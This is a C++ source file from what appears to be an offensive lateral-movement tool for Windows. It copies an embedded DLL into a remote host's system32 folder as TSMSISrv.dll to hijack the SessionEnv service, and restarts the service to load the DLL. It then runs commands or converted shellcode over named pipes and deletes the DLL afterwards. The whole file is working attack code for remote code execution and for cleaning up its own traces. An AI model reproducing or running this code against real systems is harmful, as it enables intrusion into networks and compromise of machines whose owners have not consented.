#include <Windows.h>
#include "sc_exec.h"
#include "debug.h"
#include "resource.h"
#include "named_pipe_utils.h"
#include "utils.h"


BOOL write_file(std::string target, std::string prov_name) {

	HANDLE hFile;
	std::string prov_dll_path;
	if (target.length() > 0) {
		prov_dll_path.append("\\\\");
		prov_dll_path.append(target);
		prov_dll_path.append("\\c$\\");
	}
	else {
		return FALSE;
	}

	prov_dll_path.append("Windows\\system32\\");
	prov_dll_path.append(prov_name.begin(), prov_name.end());

	hFile = CreateFile(prov_dll_path.c_str(),
		GENERIC_WRITE, 0, NULL,
		CREATE_ALWAYS, FILE_FLAG_SEQUENTIAL_SCAN, NULL);

	if (hFile == INVALID_HANDLE_VALUE) {
		DbgFprintf(outlogfile, PRINT_ERROR, "\t[-] Unable to create file '%s' Code: %d\n", prov_dll_path.c_str(), GetLastError());
		return FALSE;
	}

	//Get the resource
	HRSRC hRes = FindResource(NULL, MAKEINTRESOURCE(IDR_BIN1), "BIN1");
	if (hRes == NULL) {
		DbgFprintf(outlogfile, PRINT_ERROR, "\t[-] Unable to find resource. Code: %d\n", GetLastError());
		return FALSE;
	}

	HGLOBAL hResourceLoaded = LoadResource(NULL, hRes);
	if (hResourceLoaded == NULL) {
		DbgFprintf(outlogfile, PRINT_ERROR, "\t[-] Unable to load resource. Code: %d\n", GetLastError());
		return FALSE;
	}

	char* lpResLock = (char*)LockResource(hResourceLoaded);
	DWORD dwSizeRes = SizeofResource(NULL, hRes);

	//Write file if not zero
	if (!dwSizeRes)
		return FALSE;

	//Allocate memory
	char* buf = (char*)malloc(dwSizeRes);
	if (buf == NULL)
		return FALSE;

	memcpy(buf, lpResLock, dwSizeRes);

	DWORD dwRet = 0;
	if (!WriteFile(hFile, buf, dwSizeRes, &dwRet, NULL)) {
		DbgFprintf(outlogfile, PRINT_ERROR, "\t[-] Error writing file. Code: %d\n", GetLastError());
		free(buf);
		return FALSE;
	}

	//Free mem
	free(buf);

	//CLose handle and free resource
	dwRet = CloseHandle(hFile);
	FreeResource(hResourceLoaded);

	return TRUE;

}

BOOL delete_file(std::string target, std::string file_path) {

	HANDLE hFile;
	std::string prov_dll_path;
	if (target.length() > 0) {
		prov_dll_path.append("\\\\");
		prov_dll_path.append(target);
		prov_dll_path.append("\\c$\\");
	}
	else {
		return FALSE;
	}

	prov_dll_path.append("Windows\\system32\\");
	prov_dll_path.append(file_path.begin(), file_path.end());

	if (!DeleteFile(prov_dll_path.c_str())) {
		DbgFprintf(outlogfile, PRINT_ERROR, "\t[-] Failed to delete file. Code: %d\n", GetLastError());
		return FALSE;

	}
	return TRUE;
}


BOOL start_service(SC_HANDLE sc, std::string service_name)
{
	if (!sc)
		return FALSE;

	SC_HANDLE svc = OpenService(sc, service_name.c_str(), SERVICE_START | SERVICE_QUERY_STATUS | SERVICE_STOP);
	if (!svc) {
		DebugFprintf(outlogfile, PRINT_ERROR, "\t[-] Error OpenService: %d\n", GetLastError());
		return FALSE;
	}

	SERVICE_STATUS retPtr;
	BOOL ret = QueryServiceStatus(svc, &retPtr);
	if (ret && retPtr.dwCurrentState != SERVICE_RUNNING) {
		if (StartServiceA(svc, NULL, NULL) == 0) {
			DebugFprintf(outlogfile, PRINT_ERROR, "\t[-] Error StartService: %d\n", GetLastError());
		}

		//Sleep 3 seconds to allow the service to fully start
		Sleep(3000);
	}
	else {
		CloseServiceHandle(svc);
	}

	return TRUE;

}

BOOL stop_service(SC_HANDLE sc, std::string service_name)
{

	if (!sc)
		return FALSE;

	SC_HANDLE svc = OpenService(sc, service_name.c_str(), SERVICE_START | SERVICE_QUERY_STATUS | SERVICE_STOP);
	if (!svc) {
		DebugFprintf(outlogfile, PRINT_ERROR, "\t[-] Error OpenService: %d\n", GetLastError());
		return FALSE;
	}

	SERVICE_STATUS retPtr;
	BOOL ret = QueryServiceStatus(svc, &retPtr);
	if (ret && retPtr.dwCurrentState == SERVICE_RUNNING) {
		//Stop the service
		SERVICE_STATUS_PROCESS ssp;
		if( ControlService(svc, SERVICE_CONTROL_STOP, (LPSERVICE_STATUS)&ssp) == 0) {
			DebugFprintf(outlogfile, PRINT_ERROR, "\t[-] Error ControlService: %d\n", GetLastError());
			return FALSE;
		}

		//Sleep 3 seconds to allow the service to fully stop
		Sleep(3000);
	}
	else {
		CloseServiceHandle(svc);
	}

	return TRUE;	

}


BOOL sc_exec_func(std::string host_ip, std::string hostname, std::string cmd, std::string exe_file_path)
{
	std::vector<unsigned char>* sc_bytes = nullptr;
	if (!exe_file_path.empty()) {
		if (!convert_file_to_shellcode(exe_file_path, cmd, &sc_bytes)) {
			DebugFprintf(outlogfile, PRINT_ERROR, "\t[-] Error converting exe to shellcode\n");
			return FALSE;
		}
	}

	//open service control manager
	SC_HANDLE sc = OpenSCManager(host_ip.c_str(), NULL, SC_MANAGER_ENUMERATE_SERVICE);
	if (sc == NULL) {
		DebugFprintf(outlogfile, PRINT_ERROR, "\t[-] Error OpenSCManager: %d\n", GetLastError());
		return FALSE;
	}

	//Stop the candidate DLL Hijack service
	if (!stop_service(sc, "SessionEnv")) {
		return FALSE;
	}
		
	//Copy over DLL 
	if (!write_file(host_ip, "TSMSISrv.dll")) {
		return FALSE;
	}

	//Start the service
	if (!start_service(sc, "SessionEnv")) {
		return FALSE;
	}

	//Connect to named pipe, execute commnd, read output
	connect_named_pipes(host_ip, hostname, cmd, sc_bytes);

	//Stop the service
	stop_service(sc, "SessionEnv");

	//Delete the DLL
	delete_file(host_ip, "TSMSISrv.dll");


	return TRUE;
}